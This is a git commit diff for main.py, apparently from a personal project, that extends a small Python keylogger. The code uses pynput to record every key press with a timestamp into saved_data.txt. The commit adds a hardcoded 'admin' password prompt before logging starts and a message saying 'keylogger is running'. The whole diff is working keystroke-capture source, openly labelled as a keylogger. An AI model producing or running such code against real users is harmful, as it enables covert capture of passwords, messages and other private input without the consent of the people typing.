0caf0e3b8398ae4dd8bec91e511130125ec21a56
Que0 <zzapass0@gmail.com>
2021-11-28 02:36:12 +0100

    Simpe password check

--- main.py
+++ main.py
@@ -1,9 +1,19 @@
 from os import write
+from sys import exit
+from datetime import datetime
 from pynput.keyboard import Listener
 
 def write_to_file(data):
+    # print(data)
     with open("saved_data.txt","a") as f:
-        f.write(str(data))
+        time = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
+        try: f.write(f'\n{time} - {str(data)}')
+        except: f.write(f'\n{time} - undefined sign')
 
-with Listener(on_press=write_to_file) as l:
-    l.join()
+def main():
+    if str(input("type password: ")) == "admin":
+        print("\* keylogger is running */\nPress + to stop")
+        with Listener(on_press=write_to_file) as l: l.join()
+
+if __name__ == "__main__":
+    main()
